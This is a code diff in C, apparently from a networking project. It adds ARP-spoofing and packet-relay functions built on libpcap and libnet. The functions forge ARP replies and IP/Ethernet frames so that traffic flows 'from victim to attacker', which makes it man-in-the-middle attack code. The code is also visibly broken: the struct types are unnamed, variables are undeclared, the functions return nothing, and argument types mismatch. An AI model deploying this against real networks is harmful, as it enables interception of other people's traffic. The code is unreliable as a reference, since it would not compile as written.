@@ -85,9 +85,101 @@ u_int8_t *r_mac;
 char *r_macs;
 libnet_t *ln_context;
 char dev[32];
-
+pcap_t *my_handle;
+const struct * strip_ethernet(const struct pcap_pkthdr *header, const u_char *packet){
+	const struct *ethernet;
+	ethernet = (struct sniff_ethernet*)(packet);
+	return ethernet;
+}
+const struct * strip_arp(const struct pcap_pkthdr *header, const u_char *packet){
+	const struct *arp;
+	arp = (struct sniff_arp*)(packet + SIZE_ETHERNET);
+	return arp;
+}
+const struct * strip_ip(const struct pcap_pkthdr *header, const u_char *packet){
+	const struct *ip;
+	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
+	printf("Calling IP_HL\n");
+	size_ip = IP_HL(new_ip)*4;
+	printf("Checking ip header length\n");
+	if (size_ip < 20) {
+		printf("   * Invalid IP header length: %u bytes\n", size_ip);
+		return;
+	}
+	return ip;
+}
+int reflect_ip(u_int8_t src_mac, u_int32_t src_ip, const struct sniff_ethernet *ethernet, const struct sniff_ip *ip){
+	libnet_clear_packet(ln_context);
+	if (libnet_build_ipv4 (htons(ip->ip_len),
+    		ip->ip_tos, htons(ip->ip_id), htons(ip->ip_off),
+    		ip->ip_ttl, ip->ip_p, 0,
+    		src_ip, ip->ip_src.s_addr, payload,
+    		payload_s, ln_context, 0) == -1 )
+  	{
+    		fprintf(stderr, "Error building IP header: %s\n",\
+        	libnet_geterror(ln_context));
+    		libnet_destroy(ln_context);
+    		exit(0);
+  	}
+	// Construct Ethernet header
+	printf("Ether_type: %hu\n", ethernet->ether_type);
+	if ( libnet_build_ethernet(ethernet->ether_shost, src_mac, ETHERTYPE_IP, 
+		NULL, 0, ln_context, 0) == -1 )
+  	{
+    		fprintf(stderr, "Error building Ethernet header: %s\n",\
+        	libnet_geterror(ln_context));
+    		libnet_destroy(ln_context);
+    		exit(0);
+  	}
+	int bytes_written = libnet_write(ln_context);
+	if ( bytes_written != -1 )
+    		printf("%d bytes written.\n", bytes_written);
+  	else
+    		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
+	
+}
+int arp_spoof(u_int8_t src_mac, u_int32_t src_ip, const struct sniff_ethernet *ethernet, const struct sniff_arp *arp){
+	libnet_clear_packet(ln_context);
+	// Construct ARP header
+	if ( libnet_autobuild_arp (ARPOP_REPLY,
+		src_mac,
+      		(u_int8_t *)(&arp->tpa),
+      		arp->sha,
+      		(u_int8_t *)(&arp->spa), ln_context) == -1)
+  	{
+    		fprintf(stderr, "Error building ARP header: %s\n",\
+        	libnet_geterror(ln_context));
+    		libnet_destroy(ln_context);
+    		exit(0);
+  	}
+	printf("Constructing ethernet header\n");
+	// Construct Ethernet header
+	const char *aux = ether_ntoa((struct ether_addr *)ethernet->ether_shost);
+	printf("Source ethernet: %s\n", aux);
+	if ( libnet_build_ethernet(ethernet->ether_shost, src_mac, ETHERTYPE_ARP, 
+		NULL, 0, ln_context, 0) == -1 )
+  	{
+    		fprintf(stderr, "Error building Ethernet header: %s\n",\
+        	libnet_geterror(ln_context));
+    		libnet_destroy(ln_context);
+    		exit(0);
+  	}
+	printf("Writing arp reply\n");
+	int bytes_written = libnet_write(ln_context);
+	if ( bytes_written != -1 )
+    		printf("%d bytes written.\n", bytes_written);
+  	else
+    		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
+}
 void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){\
 	printf("Sending response from victim to attacker\n");
+											      
+											      
+	const struct sniff_ethernet *ethernet;
+	
+	
+											      
+	
 	const struct sniff_ethernet *new_ethernet; /* The ethernet header */
 	const struct sniff_ip *new_ip; /* The IP header */
 	const struct sniff_tcp *new_tcp; /* The TCP header */
@@ -98,6 +190,7 @@ void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_
 	new_ethernet = (struct sniff_ethernet*)(packet);
 	//printf("Ethernet type: %hu\n", new_ethernet->ether_type);
 	
+											      
 	new_ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
 	printf("Calling IP_HL\n");
 	//printf("%u\n", new_ip->ip_vhl);
@@ -237,6 +330,7 @@ void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, 
 	struct pcap_pkthdr header;	/* The header that pcap gives us */
 	/* Grab a packet */
 	const u_char *packet;		/* The actual packet */
+	my_handle = handle;
 	pcap_dispatch(handle, 1, relayer_got_packet, NULL);
 	printf("Done waiting for response\n");
 	return;
